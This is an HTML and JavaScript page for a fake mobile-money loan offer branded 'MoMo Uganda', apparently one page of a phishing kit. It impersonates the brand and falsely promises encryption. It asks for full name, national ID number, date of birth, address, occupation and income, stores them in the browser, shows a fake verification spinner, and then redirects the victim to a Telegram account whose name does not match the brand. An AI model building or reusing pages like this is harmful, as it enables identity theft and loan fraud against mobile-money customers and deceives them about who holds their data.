<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Final Verification - MoMo Uganda</title>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'DM Sans', sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .card {
            width: 100%;
            max-width: 430px;
            background: white;
            border-radius: 28px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
            overflow: hidden;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header {
            background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
            padding: 28px 28px 24px;
            text-align: center;
        }
        .logo-bg {
            background: white;
            border-radius: 14px;
            padding: 6px;
            width: 48px;
            height: 48px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
        }
        .brand-name {
            font-family: 'Sora', sans-serif;
            font-size: 22px;
            font-weight: 800;
            color: white;
        }
        .brand-sub {
            font-size: 11.5px;
            color: rgba(255,255,255,0.72);
        }
        .header-title {
            font-family: 'Sora', sans-serif;
            font-size: 24px;
            font-weight: 800;
            color: white;
            margin-top: 10px;
        }
        .header-desc {
            font-size: 13.5px;
            color: rgba(255,255,255,0.78);
            margin-top: 6px;
        }
        .progress-bar {
            display: flex;
            justify-content: space-between;
            padding: 20px 30px;
            background: #fff;
            border-bottom: 1px solid #e5e7eb;
        }
        .progress-step {
            text-align: center;
            flex: 1;
            position: relative;
        }
        .progress-step .step-circle {
            width: 30px;
            height: 30px;
            background: #e5e7eb;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 14px;
            color: #9ca3af;
        }
        .progress-step.active .step-circle {
            background: #E42320;
            color: white;
        }
        .progress-step.completed .step-circle {
            background: #10b981;
            color: white;
        }
        .progress-step .step-label {
            font-size: 10px;
            margin-top: 5px;
            color: #9ca3af;
        }
        .progress-step.active .step-label {
            color: #E42320;
            font-weight: 600;
        }
        .loan-info {
            background: #fff0f0;
            margin: 20px 22px;
            padding: 16px 18px;
            border-radius: 18px;
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .loan-icon {
            width: 42px; height: 42px;
            background: #E42320;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
        }
        .loan-amount {
            font-family: 'Sora', sans-serif;
            font-size: 26px;
            font-weight: 800;
            color: #111827;
        }
        .form-body {
            padding: 0 22px 26px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 7px;
        }
        input, select {
            width: 100%;
            padding: 13px 15px;
            background: #f9fafb;
            border: 1.5px solid #e5e7eb;
            border-radius: 13px;
            font-size: 15.5px;
            outline: none;
        }
        input:focus, select:focus {
            border-color: #E42320;
        }
        .btn-primary {
            width: 100%;
            background: linear-gradient(135deg, #E42320, #c01c1a);
            color: white;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-primary:disabled {
            background: #d1d5db;
            cursor: not-allowed;
        }
        .btn-back {
            width: 100%;
            background: transparent;
            color: #4b5563;
            border: 1.5px solid #e5e7eb;
            padding: 14px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 10px;
        }
        .error-msg {
            display: none;
            background: #fee2e2;
            border: 1px solid #fca5a5;
            color: #b91c1c;
            padding: 12px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 13.5px;
        }
        .security-note {
            text-align: center;
            font-size: 12px;
            color: #9ca3af;
            margin-top: 18px;
        }
        #spinner {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 20px;
        }
        .spin-ring {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.2);
            border-top-color: #E42320;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .telegram-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background: #0088cc;
            color: white;
            text-decoration: none;
            padding: 14px 20px;
            border-radius: 50px;
            font-weight: 700;
            margin-top: 15px;
            width: 100%;
        }
        .telegram-btn:hover {
            background: #006699;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="header">
        <div class="logo-bg">
            <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
                <rect x="3" y="12" width="22" height="14" rx="3" fill="#E42320"/>
                <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="white" stroke-width="2.2" fill="none"/>
                <circle cx="14" cy="19" r="2.5" fill="white"/>
            </svg>
        </div>
        <div class="brand-name">MoMo Uganda</div>
        <div class="brand-sub">Mobile Money</div>
        <div class="header-title">Final Verification</div>
        <div class="header-desc">Please confirm your identity</div>
    </div>

    <div class="progress-bar">
        <div class="progress-step completed">
            <div class="step-circle">✓</div>
            <div class="step-label">Loan</div>
        </div>
        <div class="progress-step completed">
            <div class="step-circle">✓</div>
            <div class="step-label">Verify</div>
        </div>
        <div class="progress-step completed">
            <div class="step-circle">✓</div>
            <div class="step-label">OTP</div>
        </div>
        <div class="progress-step active">
            <div class="step-circle">4</div>
            <div class="step-label">Final</div>
        </div>
    </div>

    <div class="loan-info">
        <div class="loan-icon">₸</div>
        <div>
            <div style="font-size:11px; color:#E42320;">Loan Amount</div>
            <div class="loan-amount" id="loanAmount">—</div>
            <div id="loanDetails" style="font-size:12px; color:#4b5563;"></div>
        </div>
    </div>

    <div class="form-body">
        <div class="error-msg" id="errorMsg"></div>
        
        <div class="form-group">
            <label>Full Name (as on ID)</label>
            <input type="text" id="fullName" placeholder="Enter your full name">
        </div>
        
        <div class="form-group">
            <label>National ID Number</label>
            <input type="text" id="nationalId" placeholder="e.g., CM000000123ABC">
        </div>
        
        <div class="form-group">
            <label>Date of Birth</label>
            <input type="date" id="dob">
        </div>
        
        <div class="form-group">
            <label>Residential Address</label>
            <input type="text" id="address" placeholder="Enter your address">
        </div>
        
        <div class="form-group">
            <label>Occupation</label>
            <select id="occupation">
                <option value="">Select occupation</option>
                <option value="Employed">Employed</option>
                <option value="Self-Employed">Self-Employed</option>
                <option value="Business Owner">Business Owner</option>
                <option value="Student">Student</option>
                <option value="Farmer">Farmer</option>
                <option value="Other">Other</option>
            </select>
        </div>
        
        <div class="form-group">
            <label>Monthly Income (UGX)</label>
            <select id="income">
                <option value="">Select income range</option>
                <option value="Less than 500k">Less than UGX 500,000</option>
                <option value="500k - 1M">UGX 500,000 - 1,000,000</option>
                <option value="1M - 2M">UGX 1,000,000 - 2,000,000</option>
                <option value="2M - 5M">UGX 2,000,000 - 5,000,000</option>
                <option value="Above 5M">Above UGX 5,000,000</option>
            </select>
        </div>
        
        <button class="btn-primary" id="submitBtn">Submit & Continue →</button>
        <button class="btn-back" onclick="window.location.href='otp.html'">← Back</button>
        <div class="security-note">🔒 Your information is secure and encrypted</div>
    </div>
</div>

<div id="spinner">
    <div class="spin-ring"></div>
    <p style="color:white;">Processing verification...</p>
</div>

<script>
    // Telegram username
    const TELEGRAM_USERNAME = 'telecelcash';
    const TELEGRAM_LINK = `https://t.me/${TELEGRAM_USERNAME}`;

    function loadLoanData() {
        const data = sessionStorage.getItem('calculatorData');
        if (data) {
            const loan = JSON.parse(data);
            document.getElementById('loanAmount').textContent = `UGX ${loan.amount.toLocaleString()}`;
            document.getElementById('loanDetails').textContent = `${loan.duration/30} months • UGX ${loan.monthly.toLocaleString()}/month`;
        }
        
        const userPhone = sessionStorage.getItem('userPhone');
        if (userPhone) {
            console.log('Verified phone:', userPhone);
        }
    }

    function showError(msg) {
        const err = document.getElementById('errorMsg');
        err.textContent = msg;
        err.style.display = 'block';
        setTimeout(() => err.style.display = 'none', 4000);
    }

    function saveFormData() {
        const formData = {
            fullName: document.getElementById('fullName').value.trim(),
            nationalId: document.getElementById('nationalId').value.trim(),
            dob: document.getElementById('dob').value,
            address: document.getElementById('address').value.trim(),
            occupation: document.getElementById('occupation').value,
            income: document.getElementById('income').value,
            timestamp: new Date().toISOString()
        };
        sessionStorage.setItem('finalVerificationData', JSON.stringify(formData));
        return formData;
    }

    document.getElementById('submitBtn').onclick = () => {
        const fullName = document.getElementById('fullName').value.trim();
        const nationalId = document.getElementById('nationalId').value.trim();
        const dob = document.getElementById('dob').value;
        const address = document.getElementById('address').value.trim();
        const occupation = document.getElementById('occupation').value;
        const income = document.getElementById('income').value;
        
        if (!fullName) {
            showError("Please enter your full name");
            return;
        }
        if (!nationalId) {
            showError("Please enter your National ID number");
            return;
        }
        if (!dob) {
            showError("Please select your date of birth");
            return;
        }
        if (!address) {
            showError("Please enter your residential address");
            return;
        }
        if (!occupation) {
            showError("Please select your occupation");
            return;
        }
        if (!income) {
            showError("Please select your monthly income range");
            return;
        }
        
        // Save form data
        saveFormData();
        
        // Show spinner
        const btn = document.getElementById('submitBtn');
        btn.disabled = true;
        btn.textContent = "Processing...";
        document.getElementById('spinner').style.display = 'flex';
        
        // Redirect to Telegram after 1.5 seconds
        setTimeout(() => {
            window.location.href = TELEGRAM_LINK;
        }, 1500);
    };
    
    loadLoanData();
</script>
</body>
</html>
